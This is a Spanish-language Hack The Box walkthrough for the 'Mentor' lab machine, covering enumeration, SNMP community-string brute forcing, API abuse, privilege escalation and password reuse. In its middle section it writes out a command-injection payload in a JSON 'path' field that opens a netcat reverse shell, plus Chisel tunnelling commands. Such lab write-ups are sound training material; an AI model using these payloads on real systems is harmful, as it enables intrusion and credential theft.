---
layout: single
title: Mentor - Hack The Box
excerpt: ""
date: 2023-12-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-mentor/mentor_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - FTP enumeration
---
# PortScan
___

```java
# Nmap 7.94SVN scan initiated Wed Dec 20 10:17:12 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.193
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: MentorQuotes
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.0.3 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 20 10:17:21 2023 -- 1 IP address (1 host up) scanned in 9.30 seconds

```


# Website
___
![](/assets/images/htb-writeup-mentor/Pasted image 20231220113915.png)

No redirigía a ningún lado, tampoco encontré nada en el código fuente, opté por llevar a cabo una enumeración web de directorios a través de fuzzing, pero tampoco encontré ningún directorio de interés, así que fuí a la enumeración de sub-dominios.

# Enumeration Web.
___

Curiosamente con la herramienta gobuster no encontré ningún sub-dominio, pero usé "**wfuzz**" y logré encontrar un sub-dominio de la **api.**
```bash
wfuzz -c --hc=302 -t 20 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.mentorquotes.htb" http://mentorquotes.htb

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                               
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"    
```

añadimos éste sub-dominio al **"/etc/hosts"** para el virtual hosting, una vez añadido ingresamos al sub-dominio para ver qué contenía.
![](/assets/images/htb-writeup-mentor/Pasted image 20231220114234.png)

No tenía nada en la raíz de la **api**, así que opté por buscar directorios de la api, en éste caso usé **GoBuster** para el descubrimiento.
```bash
❯ gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs/                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/docs]
/users/               (Status: 422) [Size: 186]
/admin/               (Status: 422) [Size: 186]
```

de primera veo qué hay un directorio "**admin**" en la api con un código de estado **422** similar al de **users**, así que supongo de primeras que no podré entrar a éstos directorios sin autenticación, pero igual entro a curiosear...

![](/assets/images/htb-writeup-mentor/Pasted image 20231220114522.png)

Y definitivamente, tengo que arrastrar una cookie de sesión, probablemente un JWT como cabecera para poder listar el directorio, así que ingreso al directorio "**/docs**".

![](/assets/images/htb-writeup-mentor/Pasted image 20231220114747.png)

Logrando ver primeramente qué se puede mandar un correo al usuario "**james**" lo qué me hace pensar qué es un desarrollador, y viendo los métodos & endpoints de la **API**.

hago **hovering** en donde se envía el correo a ver cómo se maneja la solicitud o a quién se envía el correo y logro ver el correo válido de **james**.
![](/assets/images/htb-writeup-mentor/Pasted image 20231220114945.png)

Viendo los métodos, de primera se me ocurre tratar de obtener los usuarios válidos, pero imaginé que sin arrastrar la cookie de sesión válida, no podré hacer ésto, igual lo intenté y no logré nada porque tenía que tener alguna cookie de sesión.
![](/assets/images/htb-writeup-mentor/Pasted image 20231220115104.png)
y definitivamente, necesitaba la cookie en las cabeceras que aún desconocía el formato, así que opté por aprovecharme que conocía los **endpoint's** y crearme un usuario, usando como intermediario **BurpSuite**.

![](/assets/images/htb-writeup-mentor/Pasted image 20231220115307.png)

Logro así crear un usuario con ID 5, así que ahora usaré el **endpoint** de autenticación con **BurpSuite** como intermediario para loguearme y ver la respuesta de la solicitud.
![](Pasted image 20231220115606.png)

el servidor como respuesta nos devuelve un **JWT**, ahora sé que tipo de cookie de sesión se está utilizando, copio éste JWT para ver sí podemos ahora sí obtener los usuarios válidos del sistema que intentamos al principio.

![](/assets/images/htb-writeup-mentor/Pasted image 20231220115905.png)
Al ver la solicitud en **BurpSuite**, veo qué no está arrastrando el **JWT**, ni está la cabecera para la autorización, así que las añado manualmente...
![](/assets/images/htb-writeup-mentor/Pasted image 20231220120747.png)

La respuesta del lado del servidor nos dice qué sólo el **admin** tiene acceso al recurso, entonces ya sé que por detrás se hace una validación para saber quién es el admin.

Intenté varias cosas con el correo de **james**, intenté cambiarle la contraseña creándome un usuario con el mismo nombre, no logré nada.
Intenté crearme un usuario con el mismo nombre, pero cambiándole el correo, tampoco logré hacer la sustitución de credenciales, así qué descarté ésto.

Ya en éste punto estaba un BASTANTE estancado, opté por volver al principio de la enumeración, pero enumeré puertos **UDP**, ya qué por defecto "**nmap**" sólo escanee puertos TCP, y para mi sorpresa...

```java
nmap -sU --min-rate 10000 10.10.11.193
____________________________________
PORT      STATE  SERVICE

161/udp   open   snmp
1081/udp  closed pvuniwien
1901/udp  closed fjicl-tep-a
17824/udp closed unknown
18888/udp closed apc-necmp
21655/udp closed unknown
```

descubrí que el puerto "**snmp**" estaba abierto, pero no conozco ninguna **community string** pertenciente a éste servicio snmp, ciertamente hay algunas predeterminadas que podía usar... pero usaré herramientas que automatizan el trabajo mediante fuerza bruta, y en éste caso usaré **Onesixtyone**, que como diccionario le pasaremos uno especial de **SecLists** con varias community's string's.

```bash
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.11.193
```
```bash
Scanning 1 hosts, 120 communities
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

reportándonos qué la **community string** para la IP indicada es "**public**", así que probaré ésta.
```bash
snmpwalk -c public -v1 10.10.11.193
```

nos reportó unas cuantas cosas, pero ninguna de interés.

Es importante decir qué existen versiones del 1 al 3 para poder conectarse a un "**snmp**" y la información que se ve en cada versión suele ser distinta, pero también su community string.

sabiendo ésto, me gustaría ver qué hay en la **"v2"**, pero tendré que descubrir nuevamente las credenciales para esta, con **Onesixtyone** no sirve para versiones más allá que la v1, así que busco otra herramienta en internet que aplique para la **v2**.

Encontrando éste exploit en **Github** [((Click aquí))](https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/master/snmpbrute.py)
Me lo traigo a local, y lo ejecuto con los parámetros necesarios, que son la IP objetivo & el diccionario a usar.
```bash
python snmpbrute.py -t 10.10.11.193 -f /usr/share/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```

![](/assets/images/htb-writeup-mentor/Pasted image 20231220123417.png)

Obteniendo la credencial válida para la **v2**, así que intentamos conectarnos con **"snmwalk"**, pero en éste caso usaré una herramienta qué hace lo mismo pero es más rápida, que es "**snmpbulkwalk**".
```bash
snmpbulkwalk -c internal -v2c 10.10.11.193 > snmp_content.txt
```

metiendo el output en un archivo **.txt** para luego verlo detalladamente ya qué es bastante contenido... buscando servicios internos que estén corriendo encontramos varios qué están ejecutando **python3** y nos muestra su respectivo **PID**.

![](/assets/images/htb-writeup-mentor/Pasted image 20231220124200.png)

conociendo éstos **PID's**, usamos "**grep**" para ver en el mismo **.txt** que están haciendo...
![](/assets/images/htb-writeup-mentor/Pasted image 20231220124339.png)

Logrando ver un script con nombre "**login.py**" en string tiene una cadena, así que de primera se me ocurre probar ésta cadena para intentar autenticarnos como "**james**" en el endpoint de autetinticación.

![](/assets/images/htb-writeup-mentor/Pasted image 20231220124538.png)

Logrando así obtener el JWT válido para el usuario "**james**", así que ahora intento listar los usuarios...
![](/assets/images/htb-writeup-mentor/Pasted image 20231220124744.png)

Viendo usuarios válidos del sistema, pero ciertamente no hay ninguna información comprometedora, así que voy al directorio "**admin**" que antes no tenía acceso...

![](/assets/images/htb-writeup-mentor/Pasted image 20231220124835.png)
Descubriendo qué este point de la **API** nos da los **endpoints** de él mismo, así que intento ver el **"backup"**, me devuelve como respuesta qué no acepta el método **GET**, asi que cambio éste por **POST**.
![](/assets/images/htb-writeup-mentor/Pasted image 20231220125022.png)

Una vez lo cambio, veo qué espera algo como cuerpo, así que viendo la estructura que usábamos al crear usuarios & autenticarnos, sé que debería ser una estructura **Json**, así que añado a la cabecera para que interpete el **Json** con el **Content-Type**.

![](/assets/images/htb-writeup-mentor/Pasted image 20231220125514.png)

Usé un cuerpo con una estructura **Json** vacía, y ver la respuesta del lado del servidor.
![](/assets/images/htb-writeup-mentor/Pasted image 20231220125544.png)

Está esperando una estructura con "**path**", así que se me ocurre qué cuando le pase una ruta del sistema, la convertirá en un **.bak** comprimido o algo parecido, de primeras se me ocurre inyectar comandos ya que controlamos la ruta qué queremos hacer **backup**.

![](/assets/images/htb-writeup-mentor/Pasted image 20231220130319.png)

Logrando que dure 5 segundos la respuesta del servidor, sé que estoy controlando el comando, entonces intento hacerme un **ping** a mí mismo para confirmarlo.
![](/assets/images/htb-writeup-mentor/Pasted image 20231220130503.png)
![](/assets/images/htb-writeup-mentor/Pasted image 20231220130531.png)

Confirmamos que estamos ejecutando comando, entonces sé me ocurre enviarme una **Reverse Shell.**, intenté con Bash pero no tuve éxito, así que intenté con **Netcat** lográndolo.

1. Nos ponemos en escucha.
```bash
rlwrap nc -nlvp PORT
```

2. Nos enviamos la Reverse Shell.
```bash
{"path":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x PORT >/tmp/f;"}
```



y ya estaríamos dentro de la máquina, pero en un contenedor, como vemos...

![](/assets/images/htb-writeup-mentor/Pasted image 20231221110609.png)


# Escalada de Privilegios #1 
___

Indagando en el contenedor de la web, en el código fuente estaba la DB con las credenciales en texto claro.

![](/assets/images/htb-writeup-mentor/Pasted image 20231221111143.png)
y vemos que lo está corriendo en el **"172.22.01"** que intuyo qué es el **HOST** el real, ya qué esta suele ser la interfaz de Docker.

la DB es una **Postgresql**, y en el contenedor no existe **"psql"** para poder ingresar a ésta base de datos desde consola, así que procederé a hacer un **Remote Port Forwarding** usando **Chisel**, pero primero hago una investigación en google para ver cual suele ser el puerto default de **Postgresql**, encontrando que suele ser el **5432**.

1. Asignamos desde local el puerto qué queremos asignar para el Port Forwarding.
```bash
./chisel server --reverse -p 1234
```

2. Desde la máquina víctima hacemos convertimos el puerto 5432 de la máquina víctima a nuestra máquina atacante.
```bash
./chisel client 10.10.x.x:1234 R:5432:172.22.0.1:5432
```

3. Nos conectamos desde nuestra máquina atacante a la DB **Postgresql** con **psql**.
```bash
psql -h 127.0.0.1 -U 'postgres' -p 5432
```
![](/assets/images/htb-writeup-mentor/Pasted image 20231221120515.png)

Ganando acceso a la DB con las credenciales qué vimos anteriormente, y encontrando unas contraseñas HASHEADAS.
![](/assets/images/htb-writeup-mentor/Pasted image 20231221121006.png)

ya sabemos la contraseña de James, pero no de **SVC** así que opto por usar **hashes.com** y ver sí podemos crackearla.

![](/assets/images/htb-writeup-mentor/Pasted image 20231221121115.png)

descubriendo que el Hash era un **MD5**, y la viendo la contraseña en texto claro, por lo que se me ocurre ver sí mediante **SSH** puedo conectarme como **SVC** a la máquina víctima.

![](/assets/images/htb-writeup-mentor/Pasted image 20231221121427.png)
y ahora sí estamos en la máquina HOST.


# Escalada de Privilegios #2
___

No encontré nada que podría llevar a una escalada de Privilegios a Root, por lo que intenté entrar a James con las credenciales anteriores que usamos para la **API**, pero no coincidían, opté por seguir indagando como **SVC** y ya que estabamos en la máquina **HOST** le eché un vistazo a la configuración del **snmp**, encontrando lo siguiente en el demonio del servicio.
![](/assets/images/htb-writeup-mentor/Pasted image 20231221122133.png)

aparentemente es una contraseña en texto claro que se usará para crear un usuario, y se convertirá en **MD5**, intento con ésta contraseña a ver sí se está reutilizando para **James**.
![](/assets/images/htb-writeup-mentor/Pasted image 20231221122247.png)
Logrando así convertirme en **James**.

# Escalada de Privilegios #3 
___

listé como **James** los **SUDOERS**.
![](/assets/images/htb-writeup-mentor/Pasted image 20231221122407.png)
viendo qué puedo ejecutar como quién sea una shell de **sh**, por lo que se me ocurre ejecutar una como Root.
![](/assets/images/htb-writeup-mentor/Pasted image 20231221122528.png)
Logrando así convertirme en ROOT de la máquina **HOST**.
